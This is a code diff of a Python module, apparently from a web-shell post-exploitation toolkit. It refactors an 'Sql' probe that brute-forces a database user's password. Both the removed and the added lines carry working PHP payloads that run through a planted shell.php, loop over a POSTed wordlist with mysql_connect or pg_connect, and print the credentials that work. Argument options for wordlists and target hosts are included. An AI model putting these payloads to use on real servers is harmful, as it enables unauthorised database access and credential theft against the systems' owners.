@@ -27,35 +27,40 @@ def uniq(seq):
 class Sql(ModuleProbe):
     """ Bruteforce SQL username"""
     
-    support_vectors = VectorList([
-            Vector('shell.php', 'check_connect', "(is_callable('$dbms_connect') && print(1)) || print(0);"),
-            Vector('shell.php', 'mysql', [ """ini_set('mysql.connect_timeout',1);
-foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
-$c=@mysql_connect("$hostname", "$username", "$pwd");
-if($c){
-print("+ $username:" . $pwd . "\n");
-break;
-}
-}mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),
-            Vector('shell.php', 'postgres', [ """foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
-$c=@pg_connect("host=$hostname user=$username password=" . $pwd . " connect_timeout=1");
-if($c){
-print("+ $username:" . $pwd . "\n");
-break;
-}
-}pg_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),                                  
-                                  
-            ])
+
+    def _init_vectors(self):
+        self.support_vectors = VectorList([
+                Vector('shell.php', 'check_connect', "(is_callable('$dbms_connect') && print(1)) || print(0);"),
+                Vector('shell.php', 'mysql', [ """ini_set('mysql.connect_timeout',1);
+    foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
+    $c=@mysql_connect("$hostname", "$username", "$pwd");
+    if($c){
+    print("+ $username:" . $pwd . "\n");
+    break;
+    }
+    }mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),
+                Vector('shell.php', 'postgres', [ """foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
+    $c=@pg_connect("host=$hostname user=$username password=" . $pwd . " connect_timeout=1");
+    if($c){
+    print("+ $username:" . $pwd . "\n");
+    break;
+    }
+    }pg_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),                                  
+                                      
+                ])
+        
     
-    
-    argparser = ArgumentParser(usage=__doc__)
-    argparser.add_argument('username', help='SQL username to bruteforce')
-    argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
-    argparser.add_argument('-wordfile', help='Local wordlist path')
-    argparser.add_argument('-startline', help='Start line of local wordlist', type=int, default=0)
-    argparser.add_argument('-chunksize', type=int, default=5000)
-    argparser.add_argument('-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=literal_eval, default=[])
-    argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
+    def _init_args(self):
+        self.argparser.add_argument('username', help='SQL username to bruteforce')
+        self.argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
+        self.argparser.add_argument('-wordfile', help='Local wordlist path')
+        self.argparser.add_argument('-startline', help='Start line of local wordlist', type=int, default=0)
+        self.argparser.add_argument('-chunksize', type=int, default=5000)
+        self.argparser.add_argument('-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=literal_eval, default=[])
+        self.argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
+
+
+        
 
     def _prepare_probe(self):
         
